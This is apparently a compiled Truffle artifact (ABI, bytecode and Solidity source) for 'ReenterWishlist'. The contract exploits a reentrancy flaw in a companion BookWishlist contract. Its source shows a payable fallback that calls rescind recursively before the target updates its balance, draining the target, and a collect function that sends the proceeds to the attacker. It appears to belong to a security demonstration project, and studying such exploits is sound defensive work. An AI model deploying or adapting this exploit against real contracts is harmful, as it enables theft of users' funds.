{
  "contractName": "ReenterWishlist",
  "abi": [
    {
      "constant": false,
      "inputs": [
        {
          "name": "_me",
          "type": "address"
        }
      ],
      "name": "collect",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "i",
          "type": "uint256"
        }
      ],
      "name": "trigger",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_t",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806103af83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103348061007b6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306ec16f814610102578063ed684cc61461013b575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c54f70d4600080604051602001526040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15156100e457600080fd5b6102c65a03f115156100f557600080fd5b5050506040518051905050005b341561010d57600080fd5b610139600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610153565b005b61015160048080359060200190919050506101ad565b005b8073ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015156101aa57600080fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c1cbbca734836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b151561023c57600080fd5b6125ee5a03f1151561024d57600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c54f70d4600080604051602001526040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b15156102e957600080fd5b6102c65a03f115156102fa57600080fd5b5050506040518051905050505600a165627a7a723058200b9a7b5ab0390280960a7d58eed19cfbe8f33daed60064c8c4704fcb27ebb4340029",
  "source": "pragma solidity ^0.4.18;\n\nimport \"./BookWishlist.sol\";\n\n/*\n * This contract is constructed to take advantage of a Reentrancy\n * flaw built into BookWishlist. It allows an attacker to completely\n * drain the contract.\n */\ncontract ReenterWishlist {\n    BookWishlist target;\n\n    function ReenterWishlist(address _t) public {\n        target = BookWishlist(_t);\n    }\n\n    /*\n     * Sends the target a contribution and immediately recinds it\n     */\n    function trigger(uint i) public payable {\n        target.contribute.value(msg.value)(i);\n        target.rescind(0);\n    }\n\n    /*\n     * Collects earnings from function.\n     */\n    function collect(address _me) public {\n        _me.transfer(this.balance);\n    }\n\n    /*\n     * When the target refunds the ether, recursively call recind again before\n     * balance is updated.\n     */\n    function () public payable {\n        target.rescind(0);\n    }\n}\n",
  "sourcePath": "/Users/Chase/security/ExampleDapp/contracts/ReenterWishlist.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2017-12-14T00:58:23.976Z"
}